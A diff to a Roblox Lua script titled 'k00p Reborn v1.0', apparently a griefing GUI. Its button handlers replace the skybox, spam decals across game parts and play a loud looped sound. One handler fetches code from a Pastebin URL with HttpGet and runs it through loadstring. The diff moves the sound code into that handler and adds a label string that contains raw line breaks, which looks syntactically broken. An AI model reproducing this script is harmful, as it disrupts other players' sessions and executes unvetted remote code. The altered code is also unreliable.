@@ -184,13 +184,6 @@ e1x1x1x1Music.MouseButton1Down:connect(function()
 		s.SkyboxRt = "http://www.roblox.com/Asset/?id=15032057838"
 		s.SkyboxUp = "http://www.roblox.com/Asset/?id=15032057838"
 		s.Parent = game.Lighting
-		Spooky = Instance.new("Sound", game.Workspace)
-		Spooky.Name = "Spooky"
-		Spooky.SoundId = "rbxassetid://6783714255"
-		Spooky.Volume = 20
-                Spooky.Pitch = 1.2
-		Spooky.Looped = true
-		Spooky:Play()
 		local ID =15032057838 --id here
 		function spamDecal(v)
 			if v:IsA("Part") then
@@ -587,7 +580,9 @@ Disc0.BackgroundColor3 = Color3.new(0.392157, 0.392157, 0.392157)
 Disc0.Position = UDim2.new(0.693121672, 0, 0.216000006, 0)
 Disc0.Size = UDim2.new(0, 89, 0, 31)
 Disc0.Font = Enum.Font.GothamBold
-Disc0.Text = "k00p Reborn v1.0"
+Disc0.Text = "k00p Reborn v1.0
++
+Blood Pop"
 Disc0.TextColor3 = Color3.fromRGB(0, 0, 0)
 Disc0.TextScaled = true
 Disc0.TextSize = 14.000
@@ -595,6 +590,14 @@ Disc0.TextWrapped = true
 Disc0.MouseButton1Down:connect(function()
      --made by me
 
+Spooky = Instance.new("Sound", game.Workspace)
+		Spooky.Name = "Spooky"
+		Spooky.SoundId = "rbxassetid://6783714255"
+		Spooky.Volume = 20
+                Spooky.Pitch = 1.2
+		Spooky.Looped = true
+		Spooky:Play()
+wait(1)
 loadstring(game:HttpGet("https://pastebin.com/raw/aMtQRfDA",true))()
 
 end)
